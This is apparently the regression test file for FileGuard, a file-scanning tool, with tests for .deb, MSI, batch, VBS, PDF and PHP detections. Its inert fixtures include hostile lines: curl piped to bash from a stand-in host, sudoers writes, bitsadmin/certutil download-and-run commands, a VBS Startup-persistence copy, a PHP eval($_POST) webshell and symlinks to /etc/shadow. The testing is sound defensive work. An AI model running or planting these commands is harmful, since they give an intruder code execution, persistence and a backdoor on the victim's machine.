"""Regression tests for FileGuard 0.5.5 (bugs found by test batch 20261115-0558).

Run from the repo root (needs python-magic and yara-python, e.g. an installed FileGuard's .venv):
    python -m unittest discover -s tests/regression -v
All fixtures are inert text built in memory; nothing is executed.
"""
import gzip
import io
import os
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path
from unittest import mock

BACKEND = Path(os.environ.get("FG_BACKEND") or Path(__file__).resolve().parents[2] / "backend").resolve()
os.environ.setdefault("FILEGUARD_HOME", str(BACKEND))
os.environ.setdefault("FILEGUARD_DATA", tempfile.mkdtemp(prefix="fg-test-data-"))
sys.path.insert(0, str(BACKEND))

from fileguard import installers, unpack  # noqa: E402
from fileguard.model import ScanContext  # noqa: E402

POSTINST_BAD = b"#!/bin/sh\nexit 0\ncurl -fsSL https://orbit.update.invalid/install.sh | bash\necho x > /etc/sudoers.d/zz\n"


def _tar_gz(files, symlinks=()):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in files.items():
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            ti.mode = 0o755
            tf.addfile(ti, io.BytesIO(data))
        for name, target in symlinks:
            ti = tarfile.TarInfo(name)
            ti.type = tarfile.SYMTYPE
            ti.linkname = target
            tf.addfile(ti)
    return buf.getvalue()


def _ar(members, gnu_long=False):
    """Build a System V/GNU ar archive like dpkg-deb does."""
    out = bytearray(b"!<arch>\n")
    longtab = b""
    hdr_names = []
    for name, _ in members:
        if gnu_long and len(name) > 15:
            hdr_names.append(f"/{len(longtab)}".encode())
            longtab += name.encode() + b"/\n"
        else:
            hdr_names.append(name.encode())

    def put(n, data):
        out.extend(n.ljust(16) + b"0".ljust(12) + b"0".ljust(6) + b"0".ljust(6) + b"100644".ljust(8)
                   + str(len(data)).encode().ljust(10) + b"`\n" + data)
        if len(data) % 2:
            out.extend(b"\n")
    if longtab:
        put(b"//", longtab)
    for n, (_, data) in zip(hdr_names, members):
        put(n, data)
    return bytes(out)


def _deb(postinst, data_symlinks=(), data_files=None):
    control = _tar_gz({"./control": b"Package: fg-t\nVersion: 1\n", "./postinst": postinst,
                       "./conffiles": b"/etc/sudoers.d/fg-t\n"})
    data = _tar_gz(data_files or {"./usr/share/doc/fg-t/README": b"hello\n"}, data_symlinks)
    return _ar([("debian-binary", b"2.0\n"), ("control.tar.gz", control), ("data.tar.gz", data)])


def _unpack(blob, name):
    d = tempfile.mkdtemp(prefix="fg-test-")
    p = Path(d) / name
    p.write_bytes(blob)
    ctx = ScanContext("t")
    inv = unpack.Unpacker(ctx, Path(d) / "out").run(str(p), name)
    return ctx, [i["rel"] for i in inv]


class DebMaintainerScripts(unittest.TestCase):
    def test_control_tar_is_unpacked(self):
        ctx, rels = _unpack(_deb(POSTINST_BAD), "fg-t_1_all.deb")
        self.assertIn("fg-t_1_all.deb!/control.tar.gz", rels)
        self.assertIn("fg-t_1_all.deb!/data.tar.gz", rels)
        self.assertTrue(any(r.endswith("!/./postinst") for r in rels), rels)
        self.assertEqual(ctx.missing, [])

    def test_gnu_long_names(self):
        blob = _ar([("debian-binary", b"2.0\n"), ("a-very-long-member-name.txt", b"x")], gnu_long=True)
        _, rels = _unpack(blob, "x.a")
        self.assertIn("x.a!/a-very-long-member-name.txt", rels)

    def test_truncated_ar_is_corrupt_not_silent(self):
        blob = _deb(b"#!/bin/sh\n")[:-40]
        ctx, _ = _unpack(blob, "bad.deb")
        self.assertIn("ARCHIVE_CORRUPT", [m.code for m in ctx.missing])

    def test_postinst_text_checks_fire(self):
        ctx = ScanContext("t")
        installers.text_checks(ctx, None, "x.deb!/control.tar.gz!/./postinst", "postinst", "", POSTINST_BAD)
        self.assertIn("PERSISTENCE_OR_MASQUERADE", [f.code for f in ctx.findings])

    def test_conffiles_are_not_treated_as_scripts(self):
        ctx = ScanContext("t")
        installers.text_checks(ctx, None, "x.deb!/control.tar.gz!/./conffiles", "conffiles", "", b"/etc/sudoers.d/fg-t\n")
        self.assertEqual(ctx.findings, [])

    def test_absolute_symlink_in_deb_payload_is_not_an_escape(self):
        ctx, _ = _unpack(_deb(b"#!/bin/sh\n", data_symlinks=[("./usr/share/zoneinfo/localtime", "/etc/localtime")]), "tz.deb")
        self.assertNotIn("ARCHIVE_LINK_ESCAPE", [f.code for f in ctx.findings])

    def test_relative_escape_in_deb_payload_still_reported(self):
        ctx, _ = _unpack(_deb(b"#!/bin/sh\n", data_symlinks=[("./usr/x", "../../../../etc/shadow")]), "esc.deb")
        self.assertIn("ARCHIVE_LINK_ESCAPE", [f.code for f in ctx.findings])

    def test_absolute_symlink_in_plain_tar_still_reported(self):
        ctx, _ = _unpack(_tar_gz({"a": b"x"}, [("link", "/etc/passwd")]), "plain.tgz")
        self.assertIn("ARCHIVE_LINK_ESCAPE", [f.code for f in ctx.findings])


MSI_EXPORT = ("\n### CustomAction\n"
              "Action\tType\tSource\tTarget\r\n"
              "s72\ti2\tS72\tS255\r\n"
              "CustomAction\tAction\r\n"
              "VbsOrbit\t38\t\tCreateObject(\"WScript.Shell\").Run \"cmd /c echo inert\", 0\r\n"
              "CmdQuartz\t50\t\tcmd.exe /c curl http://192.0.2.165/p.exe -o %TEMP%\\p.exe\r\n"
              "\n### Property\nProperty\tValue\r\ns72\tl0\r\nProperty\tProperty\r\nProductName\tBirch\r\n")


class MsiCustomActions(unittest.TestCase):
    def test_all_rows_kept_and_headers_dropped(self):
        rows = installers.msi_custom_actions(MSI_EXPORT)
        self.assertEqual([r[0] for r in rows], ["VbsOrbit", "CmdQuartz"])
        self.assertTrue(all(not r[3].endswith("\r") for r in rows))

    def test_single_action_reported(self):
        out = "\n### CustomAction\nAction\tType\tSource\tTarget\ns72\ti2\tS72\tS255\nCustomAction\tAction\nOnly\t34\t\tpowershell -c x\n"
        self.assertEqual(len(installers.msi_custom_actions(out)), 1)

    def test_msi_checks_reports_both(self):
        def fake_run(cmd, **kw):
            m = mock.Mock()
            if cmd[1] == "tables":
                m.stdout = "CustomAction\nProperty\n"
            else:
                m.stdout = MSI_EXPORT.split("### CustomAction\n", 1)[1].split("\n### Property")[0] if cmd[3] == "CustomAction" else ""
            return m
        ctx = ScanContext("t")
        with mock.patch.object(installers.shutil, "which", return_value="/usr/bin/msiinfo"), \
                mock.patch.object(installers.tools, "run_limited", side_effect=fake_run):
            installers.msi_checks(ctx, "/nonexistent.msi", "x.msi")
        ca = [f for f in ctx.findings if f.code == "MSI_CUSTOM_ACTION"]
        self.assertEqual(len(ca), 2)
        self.assertTrue(all(f.severity == "medium" for f in ca))

    def test_no_custom_actions(self):
        self.assertEqual(installers.msi_custom_actions("\n### Registry\nRegistry\tRoot\n"), [])


class MinorDetections(unittest.TestCase):
    def test_certutil_and_bitsadmin_each_reported(self):
        bat = (b"bitsadmin /transfer job /download http://203.0.113.1/p.exe %TEMP%\\p.exe & %TEMP%\\p.exe\n"
               b"certutil -urlcache -split -f http://192.0.2.1/s.exe %TEMP%\\s.exe && start %TEMP%\\s.exe\n")
        ctx = ScanContext("t")
        installers.text_checks(ctx, None, "a.bat", "a.bat", "bat", bat)
        ev = [f.evidence for f in ctx.findings if f.code == "LOLBIN_DOWNLOAD"]
        self.assertEqual(len(ev), 2)
        self.assertTrue(any(e.lower().startswith("certutil") for e in ev))

    def test_vbs_copy_to_startup(self):
        vbs = (b'CreateObject("Scripting.FileSystemObject").CopyFile WScript.ScriptFullName, '
               b'CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.vbs"\n')
        ctx = ScanContext("t")
        installers.text_checks(ctx, None, "a.vbs", "a.vbs", "vbs", vbs)
        hits = [f for f in ctx.findings if f.code == "PERSISTENCE_OR_MASQUERADE"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0].severity, "low")

    def test_clean_vbs_mentioning_startup_not_flagged(self):
        vbs = b'WScript.Echo "Open Start Menu\\Programs\\Startup to see autostart items"\n'
        ctx = ScanContext("t")
        installers.text_checks(ctx, None, "a.vbs", "a.vbs", "vbs", vbs)
        self.assertEqual(ctx.findings, [])

    def test_pdf_uri_bare_ip(self):
        from fileguard.analyzers import Analyzer
        pdf = (b"%PDF-1.7\n1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://198.51.100.65:5555/verify) >> >>\nendobj\n"
               b"2 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://docs.example.org/guide) >> >>\nendobj\n")
        p = Path(tempfile.mkdtemp()) / "a.pdf"
        p.write_bytes(pdf)
        ctx = ScanContext("t")
        an = Analyzer(ctx, lambda *a: [])
        an._pdf(str(p), "a.pdf")
        hits = [f for f in ctx.findings if f.code == "PDF_URI_BARE_IP"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0].severity, "low")
        self.assertIn("http://198.51.100.65:5555/verify", an.network)

    def test_php_eval_post_is_separate_evidence(self):
        try:
            import yara  # noqa: F401
        except ImportError:
            self.skipTest("yara-python not installed")
        from fileguard import scanners
        p = Path(tempfile.mkdtemp()) / "u.php"
        p.write_bytes(b"<?php\nexit;\nassert($_COOKIE['k']);\neval($_POST['c']);\n")
        hits = [h for h in scanners.yara_scan(str(p), "u.php") if h["rule"] == "FG_Webshell_PHP"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(len(hits[0]["instances"]), 2)
        self.assertTrue(any(i.startswith("eval($_POST") for i in hits[0]["instances"]))


class SampleRetentionWording(unittest.TestCase):
    def test_guide_matches_behaviour(self):
        from fileguard import guide
        zh, en = guide.text("zh"), guide.text("en")
        self.assertIn("原文件不会被引擎改动或删除", zh)
        self.assertIn("never modified or deleted", en)
        self.assertNotIn("样本扫完由引擎立即删除", zh)

    def test_pipeline_keeps_user_original(self):
        src = (BACKEND / "fileguard" / "pipeline.py").read_text()
        self.assertIn("shutil.copyfile(p, dest)", src)          # scans a private copy
        self.assertIn("shutil.rmtree(work, ignore_errors=True)", src)  # and deletes that copy


if __name__ == "__main__":
    unittest.main()
